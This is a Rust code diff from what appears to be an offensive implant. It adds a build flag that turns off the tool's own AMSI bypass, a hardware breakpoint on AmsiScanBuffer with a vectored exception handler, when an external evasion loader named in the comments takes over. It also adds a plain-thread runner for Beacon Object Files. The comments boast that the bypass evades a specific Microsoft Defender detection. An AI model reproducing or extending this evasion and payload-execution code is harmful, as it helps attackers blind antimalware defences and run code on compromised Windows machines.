@@ -324,23 +324,34 @@ fn _script_exec_impl(script_bytes: &[u8], args: &str, amsi_bypass: bool) -> Stri
 // AMSI BYPASS — Hardware Breakpoint + Vectored Exception Handler
 // ══════════════════════════════════════════════════════════════════════════════
 //
-// Sets a CPU debug breakpoint (DR0) on AmsiScanBuffer.  When AMSI invokes it,
+// Stripped when stratum_naked: the loader (e.g. slayer-trellix-v2) owns AMSI/ETW
+// evasion via its own DR0+DR1 HWBP + persistent VEH.
+//
+// Standard build: sets a CPU debug breakpoint (DR0) on AmsiScanBuffer.  When AMSI invokes it,
 // the CPU raises EXCEPTION_SINGLE_STEP; our VEH intercepts, sets RAX to
 // E_INVALIDARG and skips the function body.  Zero VirtualProtect, zero memory
 // writes on amsi.dll — invisible to Defender Behavior:Win32/AMSI_Patch_T.
 
-#[cfg(windows)]
+// ── stratum_naked stubs: AMSI bypass is a no-op when loader handles evasion ──
+#[cfg(all(windows, stratum_naked))]
+struct AmsiHwbp { _dummy: u8 }
+#[cfg(all(windows, stratum_naked))]
+fn _amsi_hwbp_install() -> Option<AmsiHwbp> { None }
+#[cfg(all(windows, stratum_naked))]
+fn _amsi_hwbp_remove(_bp: AmsiHwbp) {}
+
+#[cfg(all(windows, not(stratum_naked)))]
 struct AmsiHwbp {
     veh_handle: *mut std::ffi::c_void,
 }
 
-#[cfg(windows)]
+#[cfg(all(windows, not(stratum_naked)))]
 unsafe impl Send for AmsiHwbp {}
 
-#[cfg(windows)]
+#[cfg(all(windows, not(stratum_naked)))]
 static AMSI_SCAN_BUF_ADDR: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
 
-#[cfg(windows)]
+#[cfg(all(windows, not(stratum_naked)))]
 unsafe extern "system" fn _amsi_veh_handler(exception_info: *mut u8) -> i32 {
     const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
     const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
@@ -391,7 +402,7 @@ unsafe extern "system" fn _amsi_veh_handler(exception_info: *mut u8) -> i32 {
     EXCEPTION_CONTINUE_EXECUTION
 }
 
-#[cfg(windows)]
+#[cfg(all(windows, not(stratum_naked)))]
 fn _amsi_hwbp_install() -> Option<AmsiHwbp> {
     unsafe {
         let amsi_name = sb!("amsi.dll");
@@ -440,7 +451,7 @@ fn _amsi_hwbp_install() -> Option<AmsiHwbp> {
     }
 }
 
-#[cfg(windows)]
+#[cfg(all(windows, not(stratum_naked)))]
 fn _amsi_hwbp_remove(bp: AmsiHwbp) {
     unsafe {
         // Clear DR0 and DR7 local-enable bit
@@ -1050,12 +1061,48 @@ unsafe impl Send for BofCallArgs {}
 #[cfg(windows)]
 unsafe impl Sync for BofCallArgs {}
 
-#[cfg(windows)]
+// ── stratum_naked: BOF runs in a plain thread with no VEH crash guard ────────
+// The loader owns the VEH chain; adding our own would collide.
+
+#[cfg(all(windows, stratum_naked))]
+unsafe fn _bof_call_guarded(entry: usize, args_ptr: *const u8, args_len: i32) -> u32 {
+    let ctx = BofCallArgs { entry, args_ptr, args_len };
+    let h = crate::dynapi::create_thread(
+        std::ptr::null_mut(), 0,
+        _bof_thread_proc_naked,
+        &ctx as *const _ as *mut std::ffi::c_void,
+        0, std::ptr::null_mut(),
+    );
+    if h == 0 { return 0xDEAD0001; }
+    crate::dynapi::wait_for_single_object(h, 60_000);
+    let mut exit_code: u32 = 0;
+    extern "system" { fn GetExitCodeThread(h: isize, code: *mut u32) -> i32; }
+    GetExitCodeThread(h, &mut exit_code);
+    crate::dynapi::close_handle(h);
+    if exit_code == 259 { return 0xDEAD0002; }
+    exit_code
+}
+
+#[cfg(all(windows, stratum_naked))]
+unsafe extern "system" fn _bof_thread_proc_naked(param: *mut std::ffi::c_void) -> u32 {
+    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+        let ctx = &*(param as *const BofCallArgs);
+        type GoFn = unsafe extern "C" fn(*const u8, i32);
+        let go: GoFn = std::mem::transmute(ctx.entry);
+        go(ctx.args_ptr, ctx.args_len);
+    }));
+    match result {
+        Ok(_) => 0,
+        Err(_) => 0xDEAD0003,
+    }
+}
+
+#[cfg(all(windows, not(stratum_naked)))]
 static GUARDED_THREAD_ID: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
-#[cfg(windows)]
+#[cfg(all(windows, not(stratum_naked)))]
 static GUARDED_CRASH_CODE: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
 
-#[cfg(windows)]
+#[cfg(all(windows, not(stratum_naked)))]
 unsafe extern "system" fn _guarded_veh_handler(info: *mut std::ffi::c_void) -> i32 {
     // Only handle exceptions from the BOF thread
     extern "system" { fn GetCurrentThreadId() -> u32; }
@@ -1108,7 +1155,7 @@ unsafe extern "system" fn _guarded_veh_handler(info: *mut std::ffi::c_void) -> i
     -1 // EXCEPTION_CONTINUE_EXECUTION — resume at ExitThread
 }
 
-#[cfg(windows)]
+#[cfg(all(windows, not(stratum_naked)))]
 unsafe extern "system" fn _bof_thread_proc(param: *mut std::ffi::c_void) -> u32 {
     extern "system" { fn GetCurrentThreadId() -> u32; }
     GUARDED_THREAD_ID.store(GetCurrentThreadId(), std::sync::atomic::Ordering::Relaxed);
@@ -1129,7 +1176,7 @@ unsafe extern "system" fn _bof_thread_proc(param: *mut std::ffi::c_void) -> u32 
     }
 }
 
-#[cfg(windows)]
+#[cfg(all(windows, not(stratum_naked)))]
 unsafe fn _bof_call_guarded(entry: usize, args_ptr: *const u8, args_len: i32) -> u32 {
     extern "system" {
         fn AddVectoredExceptionHandler(first: u32, handler: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32) -> *mut std::ffi::c_void;
